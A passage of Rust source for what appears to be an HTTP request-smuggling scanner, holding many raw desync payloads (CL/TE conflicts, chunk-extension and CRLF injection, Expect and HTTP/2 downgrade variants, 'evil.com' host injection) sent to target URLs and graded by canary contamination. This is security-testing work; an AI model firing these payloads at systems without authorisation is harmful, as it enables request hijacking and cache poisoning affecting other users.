            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length:\r\n 4\r\n\r\nX=1\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
            self.extract_host(url)?,
            self.config.canary_prefix,
            marker,
            self.extract_host(url)?
        );

        let response = self.send_raw_request(url, &raw_request).await?;
        let timing_ms = start_time.elapsed().as_millis() as u64;

        let mut signals = Vec::new();
        let mut severity = DesyncSeverity::Low;

        if self.check_contamination(&response, &marker) {
            signals.push(DesyncSignal::ResponseContamination {
                marker: marker.clone(),
            });
            severity = DesyncSeverity::Medium;
        }

        Ok(vec![DesyncResult {
            url: url.to_string(),
            test_type: DesyncType::ObsoleteLinefolding,
            severity,
            signals,
            request_fingerprint: self.calculate_request_fingerprint(&raw_request),
            response_status: response.status,
            contamination_marker: Some(marker),
            timing_ms,
            via_header: response.headers.get("via").map(|v| v.to_string()),
            alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
            evidence: DesyncEvidence {
                raw_request,
                raw_response: response.body.clone(),
                connection_reused: false,
                server_header: response.headers.get("server").map(|v| v.to_string()),
                response_headers: response.headers.clone(),
                body_snippet: Some(response.body[..response.body.len().min(500)].to_string()),
                timing_data: TimingData {
                    baseline_ms: 0,
                    actual_ms: timing_ms,
                    samples: vec![timing_ms],
                    anomaly_detected: false,
                },
                connection_fingerprint: None,
                parser_behavior: None,
                differential_responses: Vec::new(),
                cache_indicators: Vec::new(),
            },
        }])
    }

    async fn test_chunk_edge_cases(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();

        let edge_cases = vec![
            ("Invalid chunk size", "G\r\n\r\n"),
            ("Negative chunk size", "-1\r\n\r\n"),
            (
                "Oversized chunk declaration",
                "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\r\n\r\n",
            ),
            ("Double zero chunk", "0\r\n\r\n0\r\n\r\n"),
            ("Missing CRLF in chunk", "4\ntest\r\n0\r\n\r\n"),
            ("Chunk size with spaces", "4 \r\ntest\r\n0\r\n\r\n"),
            ("Empty chunk with extension", "0;metadata=value\r\n\r\n"),
        ];

        for (test_name, chunk_data) in edge_cases {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let raw_request = format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\n\r\n{}GET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
                self.extract_host(url)?,
                chunk_data,
                self.config.canary_prefix,
                marker,
                self.extract_host(url)?
            );

            match self.send_raw_request(url, &raw_request).await {
                Ok(response) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    if self.check_contamination(&response, &marker) {
                        signals.push(DesyncSignal::ResponseContamination {
                            marker: marker.clone(),
                        });
                        severity = DesyncSeverity::High;
                    }

                    if response.status >= 400 {
                        signals.push(DesyncSignal::SplitError {
                            status: response.status,
                            headers: response
                                .headers
                                .iter()
                                .map(|(k, v)| format!("{}: {}", k, v))
                                .collect(),
                        });
                        if severity < DesyncSeverity::Medium {
                            severity = DesyncSeverity::Medium;
                        }
                    }

                    results.push(DesyncResult {
                        url: url.to_string(),
                        test_type: DesyncType::ChunkEdgeCases,
                        severity,
                        signals,
                        request_fingerprint: self.calculate_request_fingerprint(&raw_request),
                        response_status: response.status,
                        contamination_marker: Some(marker.clone()),
                        timing_ms,
                        via_header: response.headers.get("via").map(|v| v.to_string()),
                        alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
                        evidence: DesyncEvidence {
                            raw_request,
                            raw_response: response.body.clone(),
                            connection_reused: false,
                            server_header: response.headers.get("server").map(|v| v.to_string()),
                            response_headers: response.headers.clone(),
                            body_snippet: Some(
                                response.body[..response.body.len().min(500)].to_string(),
                            ),
                            timing_data: TimingData {
                                baseline_ms: 0,
                                actual_ms: timing_ms,
                                samples: vec![timing_ms],
                                anomaly_detected: false,
                            },
                            connection_fingerprint: Some(format!("chunk_edge_case_{}", test_name)),
                            parser_behavior: None,
                            differential_responses: Vec::new(),
                            cache_indicators: Vec::new(),
                        },
                    });
                }
                Err(e) => warn!("Chunk edge case test '{}' failed: {}", test_name, e),
            }

            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        Ok(results)
    }

    async fn test_chunk_extensions(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();

        let extension_tests = vec![
            ("Simple extension", "4;name=value\r\ntest\r\n0\r\n\r\n"),
            ("Multiple extensions", "4;ext1=val1;ext2=val2\r\ntest\r\n0\r\n\r\n"),
            ("Extension without value", "4;metadata\r\ntest\r\n0\r\n\r\n"),
            ("Quoted extension", "4;name=\"quoted value\"\r\ntest\r\n0\r\n\r\n"),
            ("Injection attempt", "4;name=value\r\nX-Injected: header\r\ntest\r\n0\r\n\r\n"),
            ("Long extension", "4;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\r\ntest\r\n0\r\n\r\n"),
            ("Unicode extension", "4;name=café\r\ntest\r\n0\r\n\r\n"),
            ("Bare semicolon (2025)", "4;\r\ntest\r\n0\r\n\r\n"),
            ("Multiple bare semicolons", "4;;;\r\ntest\r\n0\r\n\r\n"),
            ("Bare semicolon with injection", "4;\r\nContent-Length: 0\r\nX-Evil: injected\r\ntest\r\n0\r\n\r\n"),
            ("Semicolon chain attack", "4;a=b;;c=d;\r\ntest\r\n0\r\n\r\n"),
            ("Malformed semicolon prefix", "4;=value\r\ntest\r\n0\r\n\r\n"),
            ("Semicolon CRLF injection", "4;\r\n\r\nGET /evil HTTP/1.1\r\nHost: evil.com\r\n\r\ntest\r\n0\r\n\r\n"),
            ("Semicolon with null bytes", "4;\x00\x00\r\ntest\r\n0\r\n\r\n"),
            ("Semicolon case sensitivity", "4;Name=Value;NAME=VALUE\r\ntest\r\n0\r\n\r\n"),
            ("Semicolon boundary abuse", "4; =; = ; \r\ntest\r\n0\r\n\r\n"),
            ("Deep semicolon nesting", "4;a=b;c=d;e=f;g=h;i=j;k=l;m=n;o=p;q=r;s=t;u=v;w=x;y=z;\r\ntest\r\n0\r\n\r\n"),
            ("Binary semicolon data", "4;\x7F\x7E\x7D\x7C\r\ntest\r\n0\r\n\r\n"),
            ("Semicolon with tabs", "4;\t\t=\t\t\r\ntest\r\n0\r\n\r\n"),
        ];

        for (test_name, chunk_data) in extension_tests {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let raw_request = format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\n\r\n{}GET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
                self.extract_host(url)?,
                chunk_data,
                self.config.canary_prefix,
                marker,
                self.extract_host(url)?
            );

            match self.send_raw_request(url, &raw_request).await {
                Ok(response) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    if self.check_contamination(&response, &marker) {
                        signals.push(DesyncSignal::ResponseContamination {
                            marker: marker.clone(),
                        });
                        severity = DesyncSeverity::High;

                        signals.push(DesyncSignal::ChunkExtensionInjection {
                            extension: test_name.to_string(),
                        });
                    }

                    results.push(DesyncResult {
                        url: url.to_string(),
                        test_type: DesyncType::ChunkExtensions,
                        severity,
                        signals,
                        request_fingerprint: self.calculate_request_fingerprint(&raw_request),
                        response_status: response.status,
                        contamination_marker: Some(marker.clone()),
                        timing_ms,
                        via_header: response.headers.get("via").map(|v| v.to_string()),
                        alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
                        evidence: DesyncEvidence {
                            raw_request,
                            raw_response: response.body.clone(),
                            connection_reused: false,
                            server_header: response.headers.get("server").map(|v| v.to_string()),
                            response_headers: response.headers.clone(),
                            body_snippet: Some(
                                response.body[..response.body.len().min(500)].to_string(),
                            ),
                            timing_data: TimingData {
                                baseline_ms: 0,
                                actual_ms: timing_ms,
                                samples: vec![timing_ms],
                                anomaly_detected: false,
                            },
                            connection_fingerprint: Some(format!("chunk_ext_{}", test_name)),
                            parser_behavior: None,
                            differential_responses: Vec::new(),
                            cache_indicators: Vec::new(),
                        },
                    });
                }
                Err(e) => warn!("Chunk extension test '{}' failed: {}", test_name, e),
            }

            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        Ok(results)
    }

    async fn test_header_case_sensitivity(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();

        let case_variations = vec![
            ("content-length", "CONTENT-LENGTH"),
            ("transfer-encoding", "TRANSFER-ENCODING"),
            ("Transfer-Encoding", "transfer-encoding"),
            ("Content-Length", "content-length"),
            ("CoNtEnT-LeNgTh", "tRaNsFeR-eNcOdInG"),
        ];

        for (header1, header2) in case_variations {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let raw_request = format!(
                "POST / HTTP/1.1\r\nHost: {}\r\n{}: 4\r\n{}: chunked\r\n\r\n0\r\n\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
                self.extract_host(url)?,
                header1,
                header2,
                self.config.canary_prefix,
                marker,
                self.extract_host(url)?
            );

            match self.send_raw_request(url, &raw_request).await {
                Ok(response) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    if self.check_contamination(&response, &marker) {
                        signals.push(DesyncSignal::ResponseContamination {
                            marker: marker.clone(),
                        });
                        signals.push(DesyncSignal::HeaderCaseModification {
                            original: header1.to_string(),
                            modified: header2.to_string(),
                        });
                        severity = DesyncSeverity::Medium;
                    }

                    results.push(DesyncResult {
                        url: url.to_string(),
                        test_type: DesyncType::HeaderCaseSensitivity,
                        severity,
                        signals,
                        request_fingerprint: self.calculate_request_fingerprint(&raw_request),
                        response_status: response.status,
                        contamination_marker: Some(marker.clone()),
                        timing_ms,
                        via_header: response.headers.get("via").map(|v| v.to_string()),
                        alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
                        evidence: DesyncEvidence {
                            raw_request,
                            raw_response: response.body.clone(),
                            connection_reused: false,
                            server_header: response.headers.get("server").map(|v| v.to_string()),
                            response_headers: response.headers.clone(),
                            body_snippet: Some(
                                response.body[..response.body.len().min(500)].to_string(),
                            ),
                            timing_data: TimingData {
                                baseline_ms: 0,
                                actual_ms: timing_ms,
                                samples: vec![timing_ms],
                                anomaly_detected: false,
                            },
                            connection_fingerprint: None,
                            parser_behavior: Some(ParserBehavior {
                                accepts_duplicate_headers: true,
                                header_case_sensitivity: true,
                                chunk_extension_handling: "unknown".to_string(),
                                te_cl_precedence: "unknown".to_string(),
                                connection_header_behavior: "unknown".to_string(),
                            }),
                            differential_responses: Vec::new(),
                            cache_indicators: Vec::new(),
                        },
                    });
                }
                Err(e) => warn!("Header case sensitivity test failed: {}", e),
            }

            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        Ok(results)
    }

    async fn test_connection_reuse_exploitation(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();
        let start_time = Instant::now();
        let marker = self.generate_marker();

        let _raw_request1 = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n",
            self.extract_host(url)?
        );

        let raw_request2 = format!(
            "GET /{}-{} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n",
            self.config.canary_prefix,
            marker,
            self.extract_host(url)?
        );

        let poisoning_request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
            self.extract_host(url)?,
            self.config.canary_prefix,
            marker,
            self.extract_host(url)?
        );

        match self.send_raw_request(url, &poisoning_request).await {
            Ok(response1) => {
                tokio::time::sleep(Duration::from_millis(100)).await;

                match self.send_raw_request(url, &raw_request2).await {
                    Ok(response2) => {
                        let timing_ms = start_time.elapsed().as_millis() as u64;
                        let mut signals = Vec::new();
                        let mut severity = DesyncSeverity::Low;

                        if self.check_contamination(&response1, &marker)
                            || self.check_contamination(&response2, &marker)
                        {
                            signals.push(DesyncSignal::ResponseContamination {
                                marker: marker.clone(),
                            });
                            signals.push(DesyncSignal::ConnectionReuseAnomaly {
                                expected_reuse: true,
                                actual_reuse: response1.status == response2.status,
                            });
                            severity = DesyncSeverity::High;
                        }

                        if response1.status != response2.status {
                            signals.push(DesyncSignal::StatusCodeDiscrepancy {
                                first_response: response1.status,
                                second_response: response2.status,
                            });
                            if severity < DesyncSeverity::Medium {
                                severity = DesyncSeverity::Medium;
                            }
                        }

                        results.push(DesyncResult {
                            url: url.to_string(),
                            test_type: DesyncType::ConnectionReuse,
                            severity,
                            signals,
                            request_fingerprint: self
                                .calculate_request_fingerprint(&poisoning_request),
                            response_status: response1.status,
                            contamination_marker: Some(marker.clone()),
                            timing_ms,
                            via_header: response1.headers.get("via").map(|v| v.to_string()),
                            alt_svc: response1.headers.get("alt-svc").map(|v| v.to_string()),
                            evidence: DesyncEvidence {
                                raw_request: poisoning_request,
                                raw_response: response1.body.clone(),
                                connection_reused: true,
                                server_header: response1
                                    .headers
                                    .get("server")
                                    .map(|v| v.to_string()),
                                response_headers: response1.headers.clone(),
                                body_snippet: Some(
                                    response1.body[..response1.body.len().min(500)].to_string(),
                                ),
                                timing_data: TimingData {
                                    baseline_ms: 0,
                                    actual_ms: timing_ms,
                                    samples: vec![timing_ms],
                                    anomaly_detected: response1.status != response2.status,
                                },
                                connection_fingerprint: Some("connection_reuse_test".to_string()),
                                parser_behavior: None,
                                differential_responses: vec![DifferentialResponse {
                                    test_name: "connection_reuse".to_string(),
                                    response_a: format!(
                                        "Status: {}, Body: {}",
                                        response1.status,
                                        &response1.body[..response1.body.len().min(100)]
                                    ),
                                    response_b: format!(
                                        "Status: {}, Body: {}",
                                        response2.status,
                                        &response2.body[..response2.body.len().min(100)]
                                    ),
                                    difference_detected: response1.status != response2.status,
                                    difference_type: "status_code".to_string(),
                                }],
                                cache_indicators: Vec::new(),
                            },
                        });
                    }
                    Err(e) => warn!("Second request in connection reuse test failed: {}", e),
                }
            }
            Err(e) => warn!("First request in connection reuse test failed: {}", e),
        }

        Ok(results)
    }

    async fn test_parser_discrepancy(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();

        let discrepancy_tests = vec![
            (
                "Duplicate headers",
                "Content-Length: 4\r\nContent-Length: 0\r\n\r\ntest",
            ),
            (
                "Mixed header case",
                "content-length: 4\r\nCONTENT-LENGTH: 0\r\n\r\ntest",
            ),
            (
                "TE and CL conflict",
                "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\n",
            ),
            (
                "Invalid TE value",
                "Transfer-Encoding: invalid\r\nContent-Length: 4\r\n\r\ntest",
            ),
            ("Whitespace in headers", "Content-Length : 4\r\n\r\ntest"),
            ("Tab in headers", "Content-Length:\t4\r\n\r\ntest"),
            (
                "Header injection",
                "Content-Length: 4\r\nX-Injected: value\r\nHost: evil.com\r\n\r\ntest",
            ),
        ];

        for (test_name, headers_and_body) in discrepancy_tests {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let raw_request = format!(
                "POST / HTTP/1.1\r\nHost: {}\r\n{}GET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
                self.extract_host(url)?,
                headers_and_body,
                self.config.canary_prefix,
                marker,
                self.extract_host(url)?
            );

            match self.send_raw_request(url, &raw_request).await {
                Ok(response) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    if self.check_contamination(&response, &marker) {
                        signals.push(DesyncSignal::ResponseContamination {
                            marker: marker.clone(),
                        });
                        signals.push(DesyncSignal::ParserDiscrepancy {
                            frontend: "unknown".to_string(),
                            backend: "vulnerable".to_string(),
                        });
                        severity = DesyncSeverity::High;
                    }

                    if response.status >= 400 && response.status < 500 {
                        signals.push(DesyncSignal::SplitError {
                            status: response.status,
                            headers: response
                                .headers
                                .iter()
                                .map(|(k, v)| format!("{}: {}", k, v))
                                .collect(),
                        });
                        if severity < DesyncSeverity::Medium {
                            severity = DesyncSeverity::Medium;
                        }
                    }

                    results.push(DesyncResult {
                        url: url.to_string(),
                        test_type: DesyncType::ParserDiscrepancy,
                        severity,
                        signals,
                        request_fingerprint: self.calculate_request_fingerprint(&raw_request),
                        response_status: response.status,
                        contamination_marker: Some(marker.clone()),
                        timing_ms,
                        via_header: response.headers.get("via").map(|v| v.to_string()),
                        alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
                        evidence: DesyncEvidence {
                            raw_request,
                            raw_response: response.body.clone(),
                            connection_reused: false,
                            server_header: response.headers.get("server").map(|v| v.to_string()),
                            response_headers: response.headers.clone(),
                            body_snippet: Some(
                                response.body[..response.body.len().min(500)].to_string(),
                            ),
                            timing_data: TimingData {
                                baseline_ms: 0,
                                actual_ms: timing_ms,
                                samples: vec![timing_ms],
                                anomaly_detected: false,
                            },
                            connection_fingerprint: Some(format!(
                                "parser_discrepancy_{}",
                                test_name
                            )),
                            parser_behavior: Some(ParserBehavior {
                                accepts_duplicate_headers: test_name.contains("Duplicate"),
                                header_case_sensitivity: test_name.contains("case"),
                                chunk_extension_handling: "unknown".to_string(),
                                te_cl_precedence: if test_name.contains("TE and CL") {
                                    "tested"
                                } else {
                                    "unknown"
                                }
                                .to_string(),
                                connection_header_behavior: "unknown".to_string(),
                            }),
                            differential_responses: Vec::new(),
                            cache_indicators: Vec::new(),
                        },
                    });
                }
                Err(e) => warn!("Parser discrepancy test '{}' failed: {}", test_name, e),
            }

            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        Ok(results)
    }

    async fn test_expect_100(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();
        let host = self.extract_host(url)?;

        let expect_variants = vec![
            ("vanilla_expect", "Expect: 100-continue"),
            ("obfuscated_spacing", "Expect:\t100-continue"),
            ("mixed_case", "expect: 100-Continue"),
            ("extra_whitespace", "Expect:  100-continue  "),
            ("quoted_obfuscation", "Expect: \"100-continue\""),
            ("unicode_obfuscation", "Expect: 100\u{2010}continue"),
            ("folded_header", "Expect:\r\n\t100-continue"),
            (
                "multiple_expects",
                "Expect: 100-continue\r\nExpect: 100-continue",
            ),
            ("partial_expect", "Exp\u{200b}ect: 100-continue"),
            ("continuation_lines", "Expect: 100-\r\n continue"),
        ];

        let non_upload_routes = vec![
            "/api/users",
            "/admin/login",
            "/search",
            "/status",
            "/health",
            "/info",
            "/config",
            "/metrics",
            "/debug",
            "/",
        ];

        for (variant_name, expect_header) in &expect_variants {
            for route in &non_upload_routes {
                let start_time = Instant::now();
                let marker = self.generate_marker();

                let raw_request = format!(
                    "GET {} HTTP/1.1\r\nHost: {}\r\n{}\r\nContent-Length: 0\r\n\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n",
                    route,
                    host,
                    expect_header,
                    self.config.canary_prefix,
                    marker,
                    host
                );

                match self
                    .send_raw_request_with_timeout(url, &raw_request, Duration::from_millis(3000))
                    .await
                {
                    Ok(response) => {
                        let timing_ms = start_time.elapsed().as_millis() as u64;
                        let mut signals = Vec::new();
                        let mut severity = DesyncSeverity::Low;

                        if timing_ms > 2000 {
                            signals.push(DesyncSignal::TimingAnomaly {
                                delay_ms: timing_ms,
                                baseline_ms: 500,
                            });
                            severity = DesyncSeverity::Medium;
                        }

                        if response.status == 100 || response.body.contains("100 Continue") {
                            signals.push(DesyncSignal::Continue100 { unexpected: true });
                            severity = DesyncSeverity::High;
                        }

                        if self.check_contamination(&response, &marker) {
                            signals.push(DesyncSignal::ResponseContamination {
                                marker: marker.clone(),
                            });
                            severity = DesyncSeverity::Critical;
                        }

                        if response.body.contains("400 Bad Request") && response.body.len() > 1000 {
                            signals.push(DesyncSignal::SplitError {
                                status: response.status,
                                headers: response.headers.keys().cloned().collect(),
                            });
                            if variant_name.contains("obfuscated")
                                || variant_name.contains("unicode")
                            {
                                severity = DesyncSeverity::High;
                            }
                        }

                        let differential_response =
                            self.perform_differential_analysis(url, &raw_request).await;

                        if !signals.is_empty() || severity != DesyncSeverity::Low {
                            results.push(DesyncResult {
                                url: url.to_string(),
                                test_type: DesyncType::Expect100,
                                severity,
                                signals,
                                request_fingerprint: self
                                    .calculate_request_fingerprint(&raw_request),
                                response_status: response.status,
                                contamination_marker: Some(marker),
                                timing_ms,
                                via_header: response.headers.get("via").map(|v| v.to_string()),
                                alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
                                evidence: DesyncEvidence {
                                    raw_request: raw_request.clone(),
                                    raw_response: response.body.clone(),
                                    connection_reused: false,
                                    server_header: response
                                        .headers
                                        .get("server")
                                        .map(|v| v.to_string()),
                                    response_headers: response.headers.clone(),
                                    body_snippet: Some(
                                        response.body[..response.body.len().min(500)].to_string(),
                                    ),
                                    timing_data: TimingData {
                                        baseline_ms: 500,
                                        actual_ms: timing_ms,
                                        samples: vec![timing_ms],
                                        anomaly_detected: timing_ms > 2000,
                                    },
                                    connection_fingerprint: Some(format!(
                                        "expect_{}_{}",
                                        variant_name,
                                        route.replace("/", "")
                                    )),
                                    parser_behavior: None,
                                    differential_responses: differential_response,
                                    cache_indicators: Vec::new(),
                                },
                            });
                        }
                    }
                    Err(e) => {
                        if e.to_string().contains("timeout") {
                            let marker = self.generate_marker();
                            results.push(DesyncResult {
                                url: url.to_string(),
                                test_type: DesyncType::Expect100,
                                severity: DesyncSeverity::High,
                                signals: vec![DesyncSignal::TimingAnomaly {
                                    delay_ms: 3000,
                                    baseline_ms: 500,
                                }],
                                request_fingerprint: self
                                    .calculate_request_fingerprint(&raw_request),
                                response_status: 0,
                                contamination_marker: Some(marker),
                                timing_ms: 3000,
                                via_header: None,
                                alt_svc: None,
                                evidence: DesyncEvidence {
                                    raw_request: raw_request.clone(),
                                    raw_response: format!("TIMEOUT: {}", e),
                                    connection_reused: false,
                                    server_header: None,
                                    response_headers: HashMap::new(),
                                    body_snippet: None,
                                    timing_data: TimingData {
                                        baseline_ms: 500,
                                        actual_ms: 3000,
                                        samples: vec![3000],
                                        anomaly_detected: true,
                                    },
                                    connection_fingerprint: Some(format!(
                                        "expect_timeout_{}_{}",
                                        variant_name,
                                        route.replace("/", "")
                                    )),
                                    parser_behavior: None,
                                    differential_responses: Vec::new(),
                                    cache_indicators: Vec::new(),
                                },
                            });
                        }
                    }
                }

                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        }

        Ok(results)
    }

    async fn test_header_smuggling(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();

        let smuggling_payloads = vec![
            ("CRLF injection", "Content-Length: 0\r\n\r\nGET /evil HTTP/1.1\r\nHost: evil.com\r\n\r\n"),
            ("Header splitting", "Content-Length: 0\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: text/html\r\n\r\n"),
            ("Unicode normalization", "Content-Length: 0\r\n\u{202e}X-Evil: true\r\n\r\n"),
            ("Tab injection", "Content-Length: 0\tX-Injected: header\r\n\r\n"),
            ("Space after colon", "Content-Length : 0\r\n\r\n"),
        ];

        for (test_name, payload) in smuggling_payloads {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let raw_request = format!(
                "POST / HTTP/1.1\r\nHost: {}\r\n{}GET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
                self.extract_host(url)?,
                payload,
                self.config.canary_prefix,
                marker,
                self.extract_host(url)?
            );

            match self.send_raw_request(url, &raw_request).await {
                Ok(response) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    if self.check_contamination(&response, &marker) {
                        signals.push(DesyncSignal::ResponseContamination {
                            marker: marker.clone(),
                        });
                        severity = DesyncSeverity::High;
                    }

                    let contamination_patterns = [
                        "evil.com",
                        "X-Evil",
                        "X-Injected",
                        "X-Forwarded-For: 127.0.0.1",
                    ];

                    for pattern in &contamination_patterns {
                        if response.body.contains(pattern)
                            || response.raw_response.contains(pattern)
                        {
                            severity = DesyncSeverity::Critical;
                            break;
                        }
                    }

                    results.push(DesyncResult {
                        url: url.to_string(),
                        test_type: DesyncType::HeaderSmuggling,
                        severity,
                        signals,
                        request_fingerprint: self.calculate_request_fingerprint(&raw_request),
                        response_status: response.status,
                        contamination_marker: Some(marker.clone()),
                        timing_ms,
                        via_header: response.headers.get("via").map(|v| v.to_string()),
                        alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
                        evidence: DesyncEvidence {
                            raw_request,
                            raw_response: response.body.clone(),
                            connection_reused: false,
                            server_header: response.headers.get("server").map(|v| v.to_string()),
                            response_headers: response.headers.clone(),
                            body_snippet: Some(
                                response.body[..response.body.len().min(500)].to_string(),
                            ),
                            timing_data: TimingData {
                                baseline_ms: 0,
                                actual_ms: timing_ms,
                                samples: vec![timing_ms],
                                anomaly_detected: false,
                            },
                            connection_fingerprint: Some(format!("header_smuggling_{}", test_name)),
                            parser_behavior: None,
                            differential_responses: Vec::new(),
                            cache_indicators: Vec::new(),
                        },
                    });
                }
                Err(e) => warn!("Header smuggling test '{}' failed: {}", test_name, e),
            }

            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        Ok(results)
    }

    async fn test_http2_downgrade(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();
        let host = self.extract_host(url)?;

        let cross_protocol_patterns = vec![
            ("H2.CL_basic", 
                "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
                format!("POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\n", host)
            ),
            ("H2.TE_chunked",
                "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 
                format!("POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", host)
            ),
            ("H2.0_zero_length",
                "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
                format!("POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", host)
            ),
            ("TE.0_protocol_confusion",
                "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
                format!("POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\n\r\n", host)
            ),
            ("Cross_protocol_smuggling",
                "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
                format!("POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\nPOST /smuggled HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\n", host, host)
            ),
        ];

        for (pattern_name, h2_request, h1_request) in &cross_protocol_patterns {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let h1_with_marker = h1_request.replace(
                "\r\n\r\n",
                &format!(
                    "\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
                    self.config.canary_prefix, marker, host
                ),
            );

            match tokio::try_join!(
                self.send_raw_request_with_timeout(url, h2_request, Duration::from_millis(3000)),
                self.send_raw_request_with_timeout(
                    url,
                    &h1_with_marker,
                    Duration::from_millis(3000)
                )
            ) {
                Ok((h2_response, h1_response)) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    let h2_supported = h2_response.raw_response.contains("HTTP/2")
                        || h2_response
                            .headers
                            .get("alt-svc")
                            .is_some_and(|v| v.contains("h2"));

                    let protocol_downgrade_detected = h2_supported
                        && h1_response
                            .headers
                            .get("connection")
                            .is_some_and(|v| v.contains("close"));

                    let status_discrepancy = h2_response.status != h1_response.status;
                    let content_discrepancy =
                        (h2_response.body.len() as i32 - h1_response.body.len() as i32).abs() > 50;

                    if self.check_contamination(&h1_response, &marker) {
                        signals.push(DesyncSignal::ResponseContamination {
                            marker: marker.clone(),
                        });
                        signals.push(DesyncSignal::HTTP2ProtocolDowngrade {
                            h2_supported,
                            fallback_behavior: format!(
                                "Cross-protocol desync confirmed in {}",
                                pattern_name
                            ),
                        });
                        severity = DesyncSeverity::Critical;
                    }

                    if protocol_downgrade_detected {
                        signals.push(DesyncSignal::HTTP2ProtocolDowngrade {
                            h2_supported: true,
                            fallback_behavior: "Forced HTTP/1.1 downgrade detected".to_string(),
                        });
                        if severity == DesyncSeverity::Low {
                            severity = DesyncSeverity::Medium;
                        }
                    }

                    if status_discrepancy {
                        signals.push(DesyncSignal::StatusCodeDiscrepancy {
                            first_response: h2_response.status,
                            second_response: h1_response.status,
                        });
                        if severity == DesyncSeverity::Low {
                            severity = DesyncSeverity::Medium;
                        }
                    }

                    if content_discrepancy {
                        signals.push(DesyncSignal::UnexpectedResponseLength {
                            expected: h2_response.body.len(),
                            actual: h1_response.body.len(),
                        });
                        if severity == DesyncSeverity::Low {
                            severity = DesyncSeverity::Medium;
